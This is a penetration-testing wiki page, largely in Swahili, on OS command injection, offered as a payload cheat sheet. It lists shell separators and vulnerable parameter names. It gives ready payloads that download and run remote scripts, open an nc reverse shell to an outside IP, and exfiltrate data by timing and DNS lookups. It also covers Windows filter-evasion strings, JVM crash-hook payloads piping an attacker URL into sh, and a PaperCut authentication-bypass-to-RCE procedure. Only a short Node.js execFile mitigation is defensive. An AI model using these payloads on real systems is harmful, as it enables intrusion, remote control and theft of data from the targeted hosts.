# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Je, Command Injection ni nini?

A **command injection** inaruhusu utekelezaji wa arbitrary operating system commands na attacker kwenye server inayohost application. Kwa matokeo, application na data zake zote zinaweza kuathiriwa kabisa. Utekelezaji wa amri hizi kwa kawaida humruhusu attacker kupata unauthorized access au control juu ya mazingira ya application na mfumo wa msingi.

### Muktadha

Kutegemea na **mahali ambako input yako inaingizwa** unaweza kuhitaji **kumaliza muktadha uliowekwa ndani ya nukuu** (kutumia `"` au `'`) kabla ya amri.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Kizuizi** Bypasses

Ikiwa unajaribu kutekeleza **arbitrary commands inside a linux machine** utapendezwa kusoma kuhusu **Bypasses:**

{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Mifano**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Vigezo

Hapa kuna vigezo 25 bora ambavyo vinaweza kuwa dhaifu kwa code injection na udhaifu wa RCE unaofanana (kutoka [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Kuchota data: herufi kwa herufi
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Inategemea zana kutoka kwa `https://github.com/HoLyVieR/dnsbin` pia inapatikana kwenye dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Zana za mtandaoni za kukagua utoaji wa data kwa kutumia DNS:

- dnsbin.zhack.ca
- pingb.in

### Kuvuka vichujio

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Unapokagua back-ends za JavaScript/TypeScript, mara nyingi utakutana na API ya Node.js `child_process`.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` huanzisha **shell** (`/bin/sh -c`), kwa hivyo herufi yoyote yenye maana maalum kwa shell (back-ticks, `;`, `&&`, `|`, `$()`, …) itasababisha **command injection** wakati pembejeo ya mtumiaji inapoambatishwa kwenye string.

**Kupunguza hatari:** tumia `execFile()` (au `spawn()` bila chaguo la `shell`) na utoe **kila argument kama kipengele tofauti cha array** ili shell isihusishwe:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 ilikuwa na udhaifu kupitia tukio la WebSocket lisilotangazwa ambalo liliweka data inayodhibitiwa na mshambuliaji ndani ya `id_user`, ambayo baadaye ilingizwa kwenye wito wa `exec()`, na kusababisha RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. If the application passes untrusted strings as arguments to a system utility (even with `execve`/`execFile` and no shell), many programs will still parse any argument that begins with `-` or `--` as an option. This lets an attacker flip modes, change output paths, or trigger dangerous behaviors without ever breaking into a shell.

Typical places where this appears:

- UI za wavuti zilizojengwa / CGI handlers ambazo zinaunda amri kama `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) ambapo handler nyingi zinatumia validator dhaifu moja.

What to try:

- Toa thamani zinazoanza na `-`/`--` ili zitumiwe kama flags na zana ya downstream.
- Tumia vibaya flags zinazobadilisha tabia au kuandika faili, kwa mfano:
- `ping`: `-f`/`-c 100000` to stress the device (DoS)
- `curl`: `-o /tmp/x` to write arbitrary paths, `-K <url>` to load attacker-controlled config
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` to achieve post-rotate execution in unsafe wrappers
- If the program supports `--` end-of-options, try to bypass naive mitigations that prepend `--` in the wrong place.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM diagnostic callbacks kwa exec ya uhakika

Kila primitive inayokuwezesha **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) inaweza kubadilishwa kuwa RCE ya kuaminika bila kugusa application bytecode:

1. **Lazimisha crash inayotabirika** kwa kupunguza metaspace au heap: `-XX:MaxMetaspaceSize=16m` (au `-Xmx` ndogo). Hii inahakikisha `OutOfMemoryError` hata wakati wa bootstrap ya awali.
2. **Ambatanisha error hook**: `-XX:OnOutOfMemoryError="<cmd>"` au `-XX:OnError="<cmd>"` inatekeleza amri yoyote ya OS kila JVM inapokatika.
3. Kwa hiari ongeza `-XX:+CrashOnOutOfMemoryError` ili kuepusha jaribio la kupona na kufanya payload iwe ya mara moja.

Mifano ya payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Kwa kuwa vipimo vya utambuzi vinachanganuliwa na JVM yenyewe, hakuna shell metacharacters zinazohitajika na amri inafanya kazi kwa ngazi ile ile ya uadilifu kama launcher. Desktop IPC bugs ambazo zinapitisha user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) kwa hiyo zinatafsiri moja kwa moja kuwa OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) expose `/app?service=page/SetupCompleted`; ukitembea huko na kubofya **Login** unatolewa `JSESSIONID` halali bila kuingiza nywila (authentication bypass katika mtiririko wa setup).
- Katika **Options → Config Editor**, weka `print-and-device.script.enabled=Y` na `print.script.sandboxed=N` ili kuwasha printer scripting na kuzima sandbox.
- Kwenye kichupo cha printer **Scripting**, wezesha script na uweke `printJobHook` uliobanwa ili kuepuka makosa ya uthibitisho, lakini weka payload **outside** function ili itekelezwe mara moja unapo click **Apply** (hakuna print job inahitajika):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- Badilisha callback kwa reverse shell; ikiwa UI/PoC haiwezi kushughulikia pipes/redirects, stage payload yenye amri moja kisha exec kwa request ya pili.
- Horizon3's [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) hufanya otomatiki auth bypass, config flips, command execution, na rollback — endesha kupitia upstream proxy (mf., `proxychains` → Squid) wakati service inafikiwa tu ndani ya mtandao.

## Brute-Force Orodha ya Ugunduzi


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Marejeo

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
